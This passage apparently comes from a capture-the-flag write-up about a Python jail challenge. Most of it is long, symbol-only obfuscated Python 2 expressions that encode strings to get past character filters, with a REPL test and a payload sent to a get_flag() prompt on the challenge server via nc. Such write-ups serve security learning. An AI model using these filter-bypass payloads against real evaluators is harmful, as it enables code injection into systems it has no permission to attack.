go?"`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))# pythonPython 2.7.14+ (default, Mar 13 2018, 15:23:44) [GCC 7.3.0] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; `'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))'Am I good to go?'Yep, I am good to go! Let’s print out our working “payload”, shall we?# python func.py this_is_the_super_secret_string`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~(((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))And now, final step : let’s send it to the get_flag function in order to… Get our flag, duh.# nc problem1.tjctf.org 8004Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!&gt;&gt;&gt; get_flag("`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~(((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(~(~(~((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(~(~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~(((((~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%\xcb'`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))+`'%